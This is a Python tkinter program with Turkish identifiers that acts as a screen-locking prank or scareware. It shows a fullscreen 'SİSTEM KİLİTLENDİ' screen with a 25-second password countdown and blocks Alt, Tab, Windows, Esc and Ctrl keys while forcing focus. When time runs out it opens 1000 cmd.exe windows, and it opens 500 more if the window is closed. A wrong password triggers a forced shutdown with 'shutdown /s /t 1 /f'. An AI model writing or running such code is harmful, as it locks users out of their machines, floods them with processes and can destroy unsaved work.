import atexit
import os
import random
import subprocess
import threading
import time
import tkinter as tk

try:
  import keyboard
except ImportError:
  keyboard = None

DOGRU_SIFRE = "RİVENXS"
BEKLEME_SURESI_SN = 25
CMD_ADEDI = 1000
KAPANISTA_CMD_ADEDI = 500

RIVENXS_ASCII = r"""
  ____   ___  __     __ ______  _   _ __   __ ____
 |  _ \ |_ _| \ \   / /|  ____|| \ | |\ \ / // ___|
 | |_) | | |   \ \ / / | |__   |  \| | \ V / \___ \
 |  _ <  | |    \ V /  |  __|  | . ` |  > <   ___) |
 |_| \_\|___|    \_/   |______||_|\_| /_/ \_\ |____/
""".strip("\n")

KARAKTERLER = (
    "01アイウエオカキクケコサシスセソタチツテトナニヌネノハヒフヘホマミムメモヤユヨラリルレロワヲン#$%&*+=-<>?"
)

ENGELLI_TUSLAR = [
    "alt",
    "tab",
    "left windows",
    "right windows",
    "win",
    "esc",
    "f4",
    "ctrl",
    "control",
    "alt gr",
    "menu",
    "print screen",
]

kalan_saniye = BEKLEME_SURESI_SN
zamanlayici_aktif = True
guvenli_cikis_yapildi = False
kapanis_cmd_tetiklendi = False
pencere_arkada_acik = False
_cmd_surecleri = []
_cmd_uretim_iptal = False
_cmd_basladi = False


def cmd_penceresi_ac():
  if os.name == "nt":
    return subprocess.Popen(
        ["cmd.exe"],
        creationflags=subprocess.CREATE_NEW_CONSOLE,
        close_fds=True,
    )
  return subprocess.Popen(["cmd.exe"], close_fds=True)


def cmd_ac_1000():
  global _cmd_surecleri, _cmd_uretim_iptal, _cmd_basladi
  if _cmd_basladi:
    return
  _cmd_basladi = True
  _cmd_surecleri = []
  _cmd_uretim_iptal = False

  def _baslat():
    for _ in range(CMD_ADEDI):
      if _cmd_uretim_iptal:
        break
      try:
        p = cmd_penceresi_ac()
        _cmd_surecleri.append(p)
      except Exception:
        break

  threading.Thread(target=_baslat, daemon=True).start()


def kapanista_500_cmd_ac():
  global kapanis_cmd_tetiklendi
  if guvenli_cikis_yapildi or kapanis_cmd_tetiklendi:
    return
  kapanis_cmd_tetiklendi = True

  def _ac():
    for _ in range(KAPANISTA_CMD_ADEDI):
      try:
        cmd_penceresi_ac()
        time.sleep(0.01)
      except Exception:
        break

  threading.Thread(target=_ac, daemon=True).start()


def kapanis_cmd_tetiklendi_reset():
  global kapanis_cmd_tetiklendi
  kapanis_cmd_tetiklendi = False


def pencereyi_arkada_acik_tut_ve_500_cmd_ac(event=None):
  global pencere_arkada_acik
  if guvenli_cikis_yapildi:
    return

  pencere_arkada_acik = True
  try:
    root.attributes("-topmost", False)
    root.lower()
    root.deiconify()
  except Exception:
    pass

  kapanis_cmd_tetiklendi_reset()
  kapanista_500_cmd_ac()
  return "break"


def cmd_temizle_ve_duzelt():
  global _cmd_uretim_iptal
  _cmd_uretim_iptal = True

  for p in _cmd_surecleri:
    try:
      if p.poll() is None:
        p.terminate()
    except Exception:
      pass

  if _cmd_basladi:
    try:
      subprocess.run(
          ["taskkill", "/F", "/IM", "cmd.exe"],
          stdout=subprocess.DEVNULL,
          stderr=subprocess.DEVNULL,
          creationflags=subprocess.CREATE_NO_WINDOW if os.name == "nt" else 0,
      )
    except Exception:
      pass

  _cmd_surecleri.clear()


def sistem_tuslarini_kilitle():
  if keyboard is not None:
    for tus in ENGELLI_TUSLAR:
      try:
        keyboard.block_key(tus)
      except Exception:
        pass


def sistem_tuslarini_ac():
  if keyboard is not None:
    try:
      keyboard.unhook_all()
    except Exception:
      pass


def bilgisayari_kapat():
  global zamanlayici_aktif
  zamanlayici_aktif = False
  cmd_temizle_ve_duzelt()
  sistem_tuslarini_ac()
  os.system("shutdown /s /t 1 /f")


def normalize_sifre(metin: str) -> str:
  return metin.strip().replace("İ", "I").replace("i", "I").upper()


def geri_sayim_adim():
  global kalan_saniye
  if not zamanlayici_aktif:
    return

  if kalan_saniye > 0:
    sure_label.config(text=f"Kalan Süre: {kalan_saniye} sn", fg="#ffcc00")
    kalan_saniye -= 1
    root.after(1000, geri_sayim_adim)
  else:
    sure_label.config(
        text="SÜRE DOLDU! 1000 CMD AÇILIYOR...", fg="#ff0033"
    )
    cmd_ac_1000()


def sifreyi_kontrol(event=None):
  global zamanlayici_aktif, guvenli_cikis_yapildi
  girilen = normalize_sifre(giris_kutusu.get())
  hedef = normalize_sifre(DOGRU_SIFRE)

  if girilen == hedef:
    guvenli_cikis_yapildi = True
    zamanlayici_aktif = False
    cmd_temizle_ve_duzelt()
    sistem_tuslarini_ac()
    durum_label.config(
        text="Aleykümselam, Volkan'ın selamı baş üstüne! Sistem açılıyor...",
        fg="#00ff00",
    )
    root.after(1200, root.destroy)
  else:
    durum_label.config(
        text="HATALI ŞİFRE! SİSTEM KAPATILIYOR...",
        fg="#ff0000",
    )
    giris_kutusu.config(state="disabled")
    giris_btn.config(state="disabled")
    root.update()
    root.after(1000, bilgisayari_kapat)


atexit.register(kapanista_500_cmd_ac)

root = tk.Tk()
root.title("Güvenlik Kilidi")

root.attributes("-fullscreen", True)
root.attributes("-topmost", True)
root.overrideredirect(True)
root.configure(bg="black")
root.protocol("WM_DELETE_WINDOW", pencereyi_arkada_acik_tut_ve_500_cmd_ac)
root.bind("<Unmap>", pencereyi_arkada_acik_tut_ve_500_cmd_ac)

sistem_tuslarini_kilitle()

canvas = tk.Canvas(root, bg="black", highlightthickness=0)
canvas.pack(fill=tk.BOTH, expand=True)

sutun_genisligi = 18
damlalar = []


def yagmuru_kur(event=None):
  global damlalar
  genislik = canvas.winfo_width()
  yukseklik = canvas.winfo_height()
  if genislik <= 1:
    genislik = root.winfo_screenwidth()
  if yukseklik <= 1:
    yukseklik = root.winfo_screenheight()

  sutun_sayisi = max(1, genislik // sutun_genisligi)
  damlalar = [
      {
          "x": i * sutun_genisligi + sutun_genisligi // 2,
          "y": random.randint(-yukseklik, 0),
          "hiz": random.randint(14, 34),
          "uzunluk": random.randint(8, 22),
      }
      for i in range(sutun_sayisi)
  ]


def kod_yagmuru_adim():
  genislik = canvas.winfo_width()
  yukseklik = canvas.winfo_height()
  if genislik <= 1:
    genislik = root.winfo_screenwidth()
  if yukseklik <= 1:
    yukseklik = root.winfo_screenheight()

  if not damlalar:
    yagmuru_kur()

  if damlalar:
    canvas.delete("rain")
    for d in damlalar:
      for k in range(d["uzunluk"]):
        cy = d["y"] - k * sutun_genisligi
        if -sutun_genisligi <= cy <= yukseklik + sutun_genisligi:
          if k == 0:
            renk = "#b9ffbe"
          elif k < 3:
            renk = "#00ff55"
          elif k < d["uzunluk"] // 2:
            renk = "#009933"
          else:
            renk = "#004418"
          ch = random.choice(KARAKTERLER)
          canvas.create_text(
              d["x"],
              cy,
              text=ch,
              fill=renk,
              font=("Courier", 13, "bold"),
              tags="rain",
          )
      d["y"] += d["hiz"]
      if d["y"] - d["uzunluk"] * sutun_genisligi > yukseklik:
        d["y"] = random.randint(-200, 0)
        d["hiz"] = random.randint(14, 34)
        d["uzunluk"] = random.randint(8, 22)

    canvas.tag_lower("rain")
    canvas.tag_raise(pencere_id)

  root.after(55, kod_yagmuru_adim)


frame = tk.Frame(
    canvas,
    bg="#050505",
    padx=28,
    pady=22,
    highlightbackground="#00ff55",
    highlightthickness=1,
)

ascii_label = tk.Label(
    frame,
    text=RIVENXS_ASCII,
    font=("Courier", 13, "bold"),
    fg="#00ff66",
    bg="#050505",
    justify="left",
)
ascii_label.pack(pady=(0, 8))

baslik_label = tk.Label(
    frame,
    text="SİSTEM KİLİTLENDİ",
    font=("Courier", 22, "bold"),
    fg="#ff0055",
    bg="#050505",
)
baslik_label.pack(pady=6)

sure_label = tk.Label(
    frame,
    text=f"Kalan Süre: {BEKLEME_SURESI_SN} sn",
    font=("Courier", 14, "bold"),
    fg="#ffcc00",
    bg="#050505",
)
sure_label.pack(pady=4)

alt_baslik = tk.Label(
    frame,
    text="25 saniye içinde şifreyi girip Enter'a basın:",
    font=("Courier", 13),
    fg="white",
    bg="#050505",
)
alt_baslik.pack(pady=4)

giris_kutusu = tk.Entry(
    frame,
    font=("Courier", 20),
    justify="center",
    bg="#111111",
    fg="#00ff00",
    insertbackground="white",
    width=25,
    show="*",
)
giris_kutusu.pack(pady=12)

giris_btn = tk.Button(
    frame,
    text="GİRİŞ YAP",
    font=("Courier", 12, "bold"),
    bg="#1a1a1a",
    fg="white",
    activebackground="#333333",
    activeforeground="#00ff00",
    command=sifreyi_kontrol,
)
giris_btn.pack(pady=4)

durum_label = tk.Label(
    frame,
    text="",
    font=("Courier", 12, "bold"),
    fg="white",
    bg="#050505",
)
durum_label.pack(pady=8)

pencere_id = canvas.create_window(0, 0, window=frame, anchor=tk.CENTER)


def pencereyi_ortala(event=None):
  genislik = canvas.winfo_width()
  yukseklik = canvas.winfo_height()
  if genislik <= 1:
    genislik = root.winfo_screenwidth()
  if yukseklik <= 1:
    yukseklik = root.winfo_screenheight()
  canvas.coords(pencere_id, genislik // 2, yukseklik // 2)
  canvas.tag_raise(pencere_id)


def odagi_zorla():
  if pencere_arkada_acik:
    root.after(150, odagi_zorla)
    return
  try:
    root.lift()
    root.attributes("-topmost", True)
    root.focus_force()
    giris_kutusu.focus_force()
    root.grab_set_global()
  except Exception:
    pass
  root.after(150, odagi_zorla)


for combo in [
    "<Alt-Tab>",
    "<Alt-F4>",
    "<Escape>",
    "<Control-Escape>",
    "<Super_L>",
    "<Super_R>",
]:
  root.bind_all(combo, lambda e: "break")

canvas.bind("<Configure>", lambda e: (yagmuru_kur(e), pencereyi_ortala(e)))
root.after(100, lambda: (yagmuru_kur(), pencereyi_ortala(), odagi_zorla()))
root.after(120, kod_yagmuru_adim)
root.after(1000, geri_sayim_adim)

giris_kutusu.bind("<Return>", sifreyi_kontrol)
giris_kutusu.bind("<KP_Enter>", sifreyi_kontrol)
root.bind("<Return>", sifreyi_kontrol)

try:
  root.mainloop()
finally:
  sistem_tuslarini_ac()
  kapanista_500_cmd_ac()